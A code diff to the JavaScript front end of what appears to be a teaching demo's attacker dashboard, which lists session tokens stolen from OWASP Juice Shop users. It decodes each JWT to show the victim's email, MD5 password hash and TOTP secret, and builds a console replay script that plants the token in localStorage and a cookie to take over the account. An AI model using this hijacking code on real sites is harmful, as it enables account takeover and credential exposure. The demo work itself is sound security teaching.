@@ -106,6 +106,50 @@ async function refresh() {
   renderStats(payload);
 }
 
+// Ids of loot rows whose decoded payload is currently expanded in the table.
+const expandedPayloads = new Set();
+
+// Decode a JWT client-side. It is just base64url — no key needed, which is the
+// whole point of the demo: anyone who steals the token reads everything inside.
+function b64urlDecode(str) {
+  str = String(str).replace(/-/g, '+').replace(/_/g, '/');
+  while (str.length % 4) str += '=';
+  return decodeURIComponent(escape(atob(str)));
+}
+function decodeJwt(token) {
+  const parts = String(token).split('.');
+  if (parts.length !== 3) return null;
+  try {
+    return { header: JSON.parse(b64urlDecode(parts[0])), payload: JSON.parse(b64urlDecode(parts[1])) };
+  } catch (e) { return null; }
+}
+
+// Render the decoded token: highlighted identity fields on the left, the raw
+// header + full payload JSON on the right.
+function jwtView(token) {
+  const d = decodeJwt(token);
+  if (!d) return '<div class="jwtbox"><div class="jwtnote">Token no decodificable.</div></div>';
+  const data = (d.payload && d.payload.data) || {};
+  const fields = [
+    ['email', data.email, false],
+    ['id', data.id, false],
+    ['rol', data.role, false],
+    ['password (hash MD5)', data.password, true],
+    ['TOTP (2FA)', data.totpSecret, true],
+    ['bid (carrito)', d.payload.bid, false],
+    ['emitido (iat)', d.payload.iat ? new Date(d.payload.iat * 1000).toLocaleString() : null, false]
+  ].filter(f => f[1] !== null && f[1] !== undefined && f[1] !== '');
+  const highlights = fields.map(f =>
+    '<div class="jrow' + (f[2] ? ' danger' : '') + '"><span class="jk">' + escapeHtml(f[0]) + '</span><span class="jv">' + escapeHtml(String(f[1])) + '</span></div>'
+  ).join('');
+  return '<div class="jwtbox">'
+    + '<div class="jwtcol"><div class="jlabel">Identidad filtrada en el payload</div>' + highlights + '</div>'
+    + '<div class="jwtcol"><div class="jlabel">header</div><pre class="jpre">' + escapeHtml(JSON.stringify(d.header, null, 2)) + '</pre>'
+    + '<div class="jlabel">payload completo</div><pre class="jpre">' + escapeHtml(JSON.stringify(d.payload, null, 2)) + '</pre></div>'
+    + '<div class="jwtnote">Esto es solo base64 decodificado: no hace falta la clave. Quien roba el token lee todo esto, incluido el hash de la contraseña. La firma (3ª parte) impide modificarlo, no lo oculta. Por eso el token no debe llevar PII y debe vivir en una cookie HttpOnly.</div>'
+    + '</div>';
+}
+
 function renderStats(payload) {
   const counters = payload.counters;
   $('counters').innerHTML = [
@@ -119,8 +163,17 @@ function renderStats(payload) {
     const time = new Date(loot.ts).toLocaleTimeString();
     const origin = (String(loot.ua || '').match(/Android|iPhone|iPad|Windows|Macintosh|Linux/) || ['?'])[0];
     const victim = loot.stolen ? (loot.email || 'sesión robada') : 'sin sesión (none)';
-    const tokenCell = loot.stolen ? '<code class="tok" data-tok="' + escapeHtml(loot.token) + '" data-bid="' + (loot.bid == null ? '' : escapeHtml(String(loot.bid))) + '" title="click para copiar el script de replay">' + escapeHtml(loot.token.slice(0, 48)) + '…</code>' : '—';
-    return '<tr class="' + (loot.stolen ? 'hot' : '') + '"><td>' + time + '</td><td>' + escapeHtml(origin) + '</td><td>' + escapeHtml(victim) + '</td><td>' + tokenCell + '</td></tr>';
+    if (!loot.stolen) {
+      return '<tr><td>' + time + '</td><td>' + escapeHtml(origin) + '</td><td>' + escapeHtml(victim) + '</td><td>—</td></tr>';
+    }
+    // Detail row keyed by the loot id so a payload the presenter expanded stays
+    // open across the 3s auto-refresh.
+    const open = expandedPayloads.has(loot.id);
+    const tokenCell = '<code class="tok" data-tok="' + escapeHtml(loot.token) + '" data-bid="' + (loot.bid == null ? '' : escapeHtml(String(loot.bid))) + '" title="click para copiar el script de replay">' + escapeHtml(loot.token.slice(0, 48)) + '…</code>'
+      + ' <button class="pbtn" data-id="' + escapeHtml(loot.id) + '">' + (open ? 'ocultar payload' : 'ver payload') + '</button>';
+    const mainRow = '<tr class="hot"><td>' + time + '</td><td>' + escapeHtml(origin) + '</td><td>' + escapeHtml(victim) + '</td><td>' + tokenCell + '</td></tr>';
+    const detailRow = '<tr class="detail"' + (open ? '' : ' hidden') + '><td colspan="4">' + jwtView(loot.token) + '</td></tr>';
+    return mainRow + detailRow;
   }).join('') : '<tr><td colspan="4" class="empty">Aún no hay ejecuciones del payload.</td></tr>';
 }
 
@@ -201,6 +254,18 @@ $('btnCopy2').onclick = () => {
 // sessionStorage; without "bid" the app requests /rest/basket/NaN and crashes
 // reading .Products of null. Paste the script into the browser console of any
 // Juice Shop tab (F12) and it logs you into the victim's account.
+// "ver payload" toggles the decoded-token detail row for that loot id. We flip
+// the stored state and re-render so the open/closed state is a single source of
+// truth that also survives the 3s refresh.
+$('lootRows').addEventListener('click', event => {
+  const btn = event.target.closest('.pbtn');
+  if (!btn) return;
+  const id = btn.dataset.id;
+  if (expandedPayloads.has(id)) expandedPayloads.delete(id);
+  else expandedPayloads.add(id);
+  refresh();
+});
+
 $('lootRows').addEventListener('click', event => {
   const target = event.target.closest('.tok');
   if (!target) return;
@@ -208,6 +273,11 @@ $('lootRows').addEventListener('click', event => {
   const bid = target.dataset.bid || '';
   const script = 'localStorage.setItem("token", ' + JSON.stringify(token) + ');' +
     'sessionStorage.setItem("bid", ' + JSON.stringify(bid) + ');' +
+    // The SPA reads the token from localStorage (Bearer header), but server-
+    // rendered pages like /profile authenticate off the "token" cookie. Set
+    // both, exactly like Juice Shop's real login does, or /profile returns
+    // "Blocked illegal activity" (authenticatedUsers.get(undefined) == null).
+    'document.cookie = "token=" + ' + JSON.stringify(token) + ' + "; path=/";' +
     'location.href = "/#/";';
   copyText(script, () => { target.textContent = 'script copiado'; });
 });
